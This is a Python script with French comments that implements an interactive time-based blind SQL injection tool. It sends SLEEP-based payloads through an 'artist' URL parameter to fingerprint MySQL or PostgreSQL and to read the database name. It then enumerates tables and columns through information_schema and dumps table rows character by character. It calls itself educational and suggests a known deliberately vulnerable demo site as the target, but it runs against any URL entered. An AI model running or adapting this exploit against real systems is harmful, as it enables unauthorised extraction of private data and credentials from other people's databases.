#!/usr/bin/env python3
"""
Naïf Time-Based Blind SQL Injection Scanner
--------------------------------------------
Ce script utilise des injections basées sur le temps pour extraire des informations
d'une cible (à usage pédagogique uniquement). Il met en cache :
  - La bannière du SGBD et son type (MySQL ou PostgreSQL)
  - Le nom de la base de données (normalisé en minuscules)
  - La liste des tables et leurs colonnes
  - Le dump (quelques lignes) d'une table sélectionnée

Une interface textuelle simple permet d'interagir avec le script sans 
recalculer des informations déjà extraites.

Améliorations apportées :
    - Regroupement de la configuration, cache, et session HTTP dans une classe.
    - Utilisation d'annotations de type pour plus de clarté.
    - Gestion centralisée des affichages via Rich (si installé) ou en mode texte.
    - Refactorisation des boucles d'extraction pour éviter les répétitions.
    - Ajout d'une fonctionnalité pour sélectionner une table parmi la liste des tables extraites.
"""

import time
import requests
import sys
from typing import Tuple, Dict, List, Optional

# Tentative d'importation de Rich pour un affichage enrichi
try:
    from rich.console import Console
    from rich.prompt import Prompt
    from rich.table import Table as RichTable
    from rich import box
    console = Console()
    USE_RICH = True
except ImportError:
    USE_RICH = False

# ---------------------------
# Paramètres généraux
# ---------------------------
EXTENDED_CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}[]()-=+!@#$%^&*:;/?><,.'\" "
DEFAULT_DELAY = 5.0        # Durée SLEEP dans la condition SQL (en secondes)
MAX_LENGTH = 50            # Longueur maximale d'extraction pour éviter les boucles infinies

# ---------------------------
# Classe principale du scanner
# ---------------------------
class TimeBasedSQLScanner:
    def __init__(self, target_url: str, delay: float) -> None:
        self.target_url: str = target_url
        self.delay: float = delay
        self.session: requests.Session = requests.Session()
        # Cache pour stocker les résultats et éviter des requêtes répétées
        self.cache: Dict[str, Optional[object]] = {
            "dbname": None,
            "banner": None,
            "dbms": None,
            "tables": {},     # type: Dict[int, str]
            "columns": {}     # type: Dict[str, List[str]]
        }

    # ---------------------------
    # Fonctions d'affichage
    # ---------------------------
    @staticmethod
    def print_info(message: str) -> None:
        if USE_RICH:
            console.print(f"[cyan][*][/cyan] {message}")
        else:
            print(f"[*] {message}")

    @staticmethod
    def print_warn(message: str) -> None:
        if USE_RICH:
            console.print(f"[yellow][!][/yellow] {message}")
        else:
            print(f"[!] {message}")

    @staticmethod
    def print_found(message: str) -> None:
        if USE_RICH:
            console.print(f"[green]{message}[/green]")
        else:
            print(message)

    @staticmethod
    def input_str(prompt_text: str) -> str:
        if USE_RICH:
            return Prompt.ask(prompt_text)
        else:
            return input(prompt_text + ": ")

    # ---------------------------
    # Fonctions de mesure de temps et vérification
    # ---------------------------
    def measure_time(self, payload: str) -> float:
        """Envoie une requête GET avec le paramètre 'artist' égal au payload et retourne le temps de réponse."""
        params = {"artist": payload}
        start_time = time.time()
        try:
            self.session.get(self.target_url, params=params, timeout=self.delay + 5)
        except requests.RequestException:
            return 0.0
        return time.time() - start_time

    def check_condition(self, payload: str) -> bool:
        """
        Retourne True si la durée de réponse de la requête est supérieure ou égale à self.delay.
        """
        elapsed = self.measure_time(payload)
        return elapsed >= self.delay

    # ---------------------------
    # Fonction d'extraction de chaîne caractère par caractère
    # ---------------------------
    def extract_string(self, query: str, max_length: int = MAX_LENGTH) -> str:
        """
        Extrait une chaîne de caractère à partir d'une requête SQL donnée.
        La requête finale aura la forme :
            1 AND IF(SUBSTRING((query), pos, 1) = 'c', SLEEP(delay), 0)
        """
        result = ""
        pos = 1
        while pos <= max_length:
            found = False
            for ch in EXTENDED_CHARSET:
                payload = f"1 AND IF(SUBSTRING(({query}),{pos},1)='{ch}', SLEEP({self.delay}),0)"
                if self.check_condition(payload):
                    # Pour éviter les boucles infinies, si on trouve un espace après avoir extrait une partie, on termine
                    if ch == " " and result != "":
                        found = False
                        break
                    result += ch
                    self.print_found(f"pos {pos}: Found '{ch}' => so far: '{result}'")
                    found = True
                    break
            if not found:
                break
            pos += 1
        return result.strip()

    # ---------------------------
    # Extraction Banner & détection du SGBD
    # ---------------------------
    def get_banner_and_dbms(self) -> Tuple[str, str]:
        self.print_info("Récupération de la bannière DBMS par injection time-based...")
        # Tentative pour MySQL
        banner_mysql = self.extract_string("@@version")
        if banner_mysql:
            if "mysql" in banner_mysql.lower():
                self.cache["banner"] = banner_mysql
                self.cache["dbms"] = "MySQL"
                self.print_found(f"[BANNER] => {banner_mysql}")
                return banner_mysql, "MySQL"
            else:
                # Si le contenu est différent, on renvoie quand même
                self.cache["banner"] = banner_mysql
                self.cache["dbms"] = "Unknown"
                self.print_found(f"[BANNER] (contenu inattendu) => {banner_mysql}")
                return banner_mysql, "Unknown"

        # Tentative pour PostgreSQL
        banner_pg = self.extract_string("version()")
        if banner_pg:
            if "postgres" in banner_pg.lower():
                self.cache["banner"] = banner_pg
                self.cache["dbms"] = "PostgreSQL"
                self.print_found(f"[BANNER] => {banner_pg}")
                return banner_pg, "PostgreSQL"
            else:
                self.cache["banner"] = banner_pg
                self.cache["dbms"] = "Unknown"
                self.print_found(f"[BANNER] (inconnu) => {banner_pg}")
                return banner_pg, "Unknown"

        self.print_warn("Aucune bannière détectée.")
        return "", "Unknown"

    # ---------------------------
    # Extraction du nom de la base de données
    # ---------------------------
    def get_database_name(self) -> str:
        self.print_info("Récupération du nom de la base de données via injection time-based...")
        # Essai avec DATABASE() (pour MySQL)
        db = self.extract_string("DATABASE()")
        if db:
            db = db.lower().strip()
            self.cache["dbname"] = db
            self.print_found(f"DATABASE() => {db}")
            return db

        # Essai avec current_database() (pour PostgreSQL)
        db = self.extract_string("current_database()")
        if db:
            db = db.lower().strip()
            self.cache["dbname"] = db
            self.print_found(f"current_database() => {db}")
            return db

        self.print_warn("Extraction du nom de la base échouée.")
        return ""

    # ---------------------------
    # Extraction des tables via information_schema
    # ---------------------------
    def get_table_count(self, db_name: str, max_tables: int = 50) -> int:
        self.print_info("Détermination du nombre de tables dans la base...")
        for cnt in range(1, max_tables + 1):
            payload = (f"1 AND IF((SELECT COUNT(*) FROM information_schema.tables "
                       f"WHERE table_schema='{db_name}')={cnt}, SLEEP({self.delay}),0)")
            if self.check_condition(payload):
                self.print_found(f"Nombre de tables = {cnt}")
                return cnt
        self.print_warn("Nombre de tables non déterminé (max_tables dépassé).")
        return 0

    def get_table_name(self, db_name: str, index: int) -> str:
        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {index},1"
        self.print_info(f"Extraction du nom de la table #{index + 1}...")
        tname = self.extract_string(query)
        return tname.strip()

    # ---------------------------
    # Extraction des colonnes d'une table
    # ---------------------------
    def get_column_count(self, db_name: str, table_name: str, max_cols: int = 50) -> int:
        self.print_info(f"Détermination du nombre de colonnes dans la table '{table_name}'...")
        for cnt in range(1, max_cols + 1):
            payload = (f"1 AND IF((SELECT COUNT(*) FROM information_schema.columns "
                       f"WHERE table_schema='{db_name}' AND table_name='{table_name}')={cnt}, SLEEP({self.delay}),0)")
            if self.check_condition(payload):
                self.print_found(f"Nombre de colonnes dans '{table_name}' = {cnt}")
                return cnt
        self.print_warn("Nombre de colonnes non déterminé (max_cols dépassé).")
        return 0

    def get_column_name(self, db_name: str, table_name: str, index: int) -> str:
        query = (f"SELECT column_name FROM information_schema.columns "
                 f"WHERE table_schema='{db_name}' AND table_name='{table_name}' LIMIT {index},1")
        self.print_info(f"Extraction du nom de la colonne #{index + 1} de la table '{table_name}'...")
        colname = self.extract_string(query)
        return colname.strip()

    # ---------------------------
    # Dump des données d'une table
    # ---------------------------
    def get_row_count(self, db_name: str, table_name: str, max_rows: int = 50) -> int:
        self.print_info(f"Comptage des lignes dans la table '{table_name}'...")
        for r in range(1, max_rows + 1):
            payload = f"1 AND IF((SELECT COUNT(*) FROM `{db_name}`.`{table_name}`)={r}, SLEEP({self.delay}),0)"
            if self.check_condition(payload):
                self.print_found(f"Nombre de lignes dans '{table_name}' = {r}")
                return r
        self.print_warn("Nombre de lignes non déterminé (max_rows dépassé).")
        return 0

    def get_cell_value(self, db_name: str, table_name: str, column_name: str, row_index: int) -> str:
        query = f"SELECT `{column_name}` FROM `{db_name}`.`{table_name}` LIMIT {row_index},1"
        self.print_info(f"Extraction de la valeur de la colonne '{column_name}', ligne {row_index + 1}...")
        cell_val = self.extract_string(query)
        return cell_val.strip()

    def dump_table_data(self, db_name: str, table_name: str, columns: List[str], max_rows_dump: int = 3) -> None:
        row_count = self.get_row_count(db_name, table_name)
        if row_count == 0:
            self.print_warn(f"Aucune ligne trouvée dans la table '{table_name}'.")
            return
        limit = min(row_count, max_rows_dump)
        self.print_info(f"Dump de {limit} ligne(s) depuis la table '{table_name}':\n")
        for r in range(limit):
            row_data = {}
            for col in columns:
                row_data[col] = self.get_cell_value(db_name, table_name, col, r)
            # Formatage de l'affichage
            if USE_RICH:
                row_str = " | ".join(f"{k}={v}" for k, v in row_data.items())
                self.print_found(f"[Row {r + 1}] {row_str}")
            else:
                self.print_found(f"[Row {r + 1}] => {row_data}")
        print("")  # Ligne vide pour la lisibilité

    # ---------------------------
    # Interface menu
    # ---------------------------
    def display_menu(self) -> str:
        menu = (
            "\nOptions disponibles:\n"
            "  1 - Extraire le nom de la base de données\n"
            "  2 - Extraire le banner DBMS et détecter le type\n"
            "  3 - Lister les tables et colonnes\n"
            "  4 - Dump du contenu d'une table\n"
            "  q - Quitter"
        )
        self.print_info(menu)
        return self.input_str("Votre choix").strip().lower()

    def run(self) -> None:
        # Affichage de l'entête
        if USE_RICH:
            console.rule("[bold yellow]Naïf Time-Based Blind SQLi Scanner[/bold yellow]")
        else:
            print("=== Naïf Time-Based Blind SQLi Scanner ===")

        # Saisie de l'URL et du délai (si non déjà défini)
        if not self.target_url.startswith("http"):
            self.print_warn("L'URL doit commencer par http:// ou https://")
            sys.exit(1)

        self.print_info(f"Cible = {self.target_url} | Délai = {self.delay} sec")

        # Boucle du menu interactif
        while True:
            choice = self.display_menu()
            if choice in ('q', 'quit'):
                self.print_info("Au revoir.")
                sys.exit(0)
            elif choice == '1':
                # Extraction du nom de la base de données
                if self.cache["dbname"]:
                    self.print_found(f"[DB NAME] (cache) : {self.cache['dbname']}")
                else:
                    dbname = self.get_database_name()
                    if dbname:
                        self.print_found(f"[DB NAME] : {dbname}")
                    else:
                        self.print_warn("Échec de l'extraction du nom de la base.")
            elif choice == '2':
                # Extraction de la bannière et du type DBMS
                if self.cache["banner"] and self.cache["dbms"]:
                    self.print_found(f"[BANNER] (cache) : {self.cache['banner']}")
                    self.print_found(f"[DBMS] (cache) : {self.cache['dbms']}")
                else:
                    banner, dbms = self.get_banner_and_dbms()
                    if banner:
                        self.print_found(f"[BANNER] : {banner}")
                    else:
                        self.print_warn("Aucun banner détecté.")
                    self.print_found(f"[DBMS] : {dbms}")
            elif choice == '3':
                # Extraction de la liste des tables et colonnes
                if not self.cache["dbname"]:
                    self.print_warn("Le nom de la base de données n'est pas extrait. Choisissez l'option 1 d'abord.")
                    continue
                dbname = self.cache["dbname"]  # type: str
                # Récupération ou extraction des tables
                if not self.cache["tables"]:
                    tcount = self.get_table_count(dbname)
                    if tcount == 0:
                        self.print_warn("Aucune table trouvée ou impossible de déterminer leur nombre.")
                        continue
                    self.print_info(f"Nombre de tables dans '{dbname}' : {tcount}")
                    tables = {}
                    for i in range(tcount):
                        tname = self.get_table_name(dbname, i)
                        tables[i] = tname
                        self.cache["tables"][i] = tname
                        self.print_found(f"[TABLE #{i + 1}] => {tname}")
                else:
                    tables = self.cache["tables"]

                # Affichage des tables et colonnes
                if USE_RICH:
                    rich_table = RichTable(title="Tables disponibles", box=box.MINIMAL_DOUBLE_HEAD)
                    rich_table.add_column("Index", style="cyan", no_wrap=True)
                    rich_table.add_column("Table", style="magenta")
                    for idx, tname in tables.items():
                        rich_table.add_row(str(idx + 1), tname)
                    console.print(rich_table)
                else:
                    self.print_info("Tables disponibles :")
                    for idx, tname in tables.items():
                        self.print_found(f"  {idx + 1}. {tname}")

                # Sélection d'une table par l'utilisateur
                while True:
                    try:
                        sel = int(self.input_str("Entrez l'index de la table à sélectionner"))
                        if 1 <= sel <= len(tables):
                            selected_table = tables[sel - 1]
                            break
                        else:
                            self.print_warn("Index invalide.")
                    except ValueError:
                        self.print_warn("Choix invalide.")

                self.print_info(f"Table sélectionnée : {selected_table}")

                # Extraction des colonnes de la table sélectionnée
                if selected_table in self.cache["columns"]:
                    cols = self.cache["columns"][selected_table]
                else:
                    ccount = self.get_column_count(dbname, selected_table)
                    if ccount == 0:
                        self.print_warn("Aucune colonne trouvée pour cette table.")
                        continue
                    cols = []
                    for idx in range(ccount):
                        col = self.get_column_name(dbname, selected_table, idx)
                        cols.append(col)
                    self.cache["columns"][selected_table] = cols
                self.print_found(f"Colonnes de '{selected_table}' : {cols}")

                # Option pour dump les données de la table sélectionnée
                if self.input_str(f"Voulez-vous dump les données de '{selected_table}'? (y/n)").lower() == 'y':
                    self.dump_table_data(dbname, selected_table, cols, max_rows_dump=3)
            elif choice == '4':
                # Dump du contenu d'une table
                if not self.cache["dbname"]:
                    self.print_warn("Le nom de la base de données n'est pas extrait. Choisissez l'option 1 d'abord.")
                    continue
                dbname = self.cache["dbname"]
                # Vérifier/extraire la liste des tables
                if not self.cache["tables"]:
                    tcount = self.get_table_count(dbname)
                    if tcount == 0:
                        self.print_warn("Aucune table trouvée ou impossible de déterminer le nombre.")
                        continue
                    tables = {}
                    for i in range(tcount):
                        tname = self.get_table_name(dbname, i)
                        tables[i] = tname
                        self.cache["tables"][i] = tname
                        self.print_found(f"[TABLE #{i + 1}] => {tname}")
                else:
                    tables = self.cache["tables"]

                if not tables:
                    self.print_warn("Aucune table trouvée.")
                    continue

                # Affichage des tables disponibles
                if USE_RICH:
                    tables_table = RichTable(title="Liste des Tables", box=box.MINIMAL_DOUBLE_HEAD)
                    tables_table.add_column("Index", style="cyan", no_wrap=True)
                    tables_table.add_column("Table", style="magenta")
                    for idx, t in enumerate(tables.values(), start=1):
                        tables_table.add_row(str(idx), t)
                    console.print(tables_table)
                else:
                    self.print_info("Liste des tables :")
                    for idx, t in enumerate(tables.values(), start=1):
                        self.print_found(f"  {idx}. {t}")

                try:
                    sel = int(self.input_str("Entrez l'index de la table à dumper"))
                    if sel < 1 or sel >= len(tables) + 1:
                        self.print_warn("Index invalide.")
                        continue
                except ValueError:
                    self.print_warn("Choix invalide.")
                    continue

                table_to_dump = list(tables.values())[sel - 1]
                self.print_info(f"Dump du contenu de la table '{table_to_dump}'...")

                # Extraction des colonnes pour la table choisie
                if table_to_dump in self.cache["columns"] and self.cache["columns"][table_to_dump]:
                    cols = self.cache["columns"][table_to_dump]
                else:
                    ccount = self.get_column_count(dbname, table_to_dump)
                    if ccount == 0:
                        self.print_warn("Aucune colonne trouvée pour cette table.")
                        continue
                    cols = []
                    for idx in range(ccount):
                        col = self.get_column_name(dbname, table_to_dump, idx)
                        cols.append(col)
                    self.cache["columns"][table_to_dump] = cols
                self.print_found(f"Colonnes de '{table_to_dump}' : {cols}")

                # Dump des données
                self.dump_table_data(dbname, table_to_dump, cols, max_rows_dump=3)
            else:
                self.print_warn("Option non reconnue.")

# ---------------------------
# Fonction principale du script
# ---------------------------
def main() -> None:
    # Saisie de l'URL cible et du délai
    target_url = TimeBasedSQLScanner.input_str("Entrez l'URL cible (ex: http://testphp.vulnweb.com/artists.php)")
    try:
        delay_val = float(TimeBasedSQLScanner.input_str("Entrez le délai (ex: 2.0)"))
    except ValueError:
        TimeBasedSQLScanner.print_warn("Délai invalide, utilisation de 2.0")
        delay_val = 2.0

    scanner = TimeBasedSQLScanner(target_url, delay_val)
    scanner.run()

if __name__ == "__main__":
    main()